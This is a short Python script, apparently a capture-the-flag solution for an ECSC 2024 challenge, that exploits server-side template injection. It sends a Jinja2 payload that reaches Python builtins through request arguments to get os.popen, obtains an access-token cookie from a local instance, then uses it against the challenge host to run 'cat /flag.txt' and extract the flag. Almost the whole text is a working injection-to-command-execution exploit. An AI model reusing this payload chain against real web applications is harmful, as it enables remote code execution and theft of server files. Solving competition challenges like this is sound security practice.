import requests
import urllib
import re

payload = "admin{{ request[request.args.a][request.args.b][request.args.c][request.args.d](request.args.e).popen(request.args.f).read() }}"
res = requests.get(f'http://localhost:5003/?u={urllib.parse.quote_plus(payload)}')
cookie = res.text

res = requests.get('https://turtles.ecsc24.hack.cert.pl/admin?a=application&b=__globals__&c=__builtins__&d=__import__&e=os&f=cat%20/flag.txt',
                   cookies={'access_token_cookie': res.text})

print(re.findall(r'ecsc24{.*}', res.text)[0])
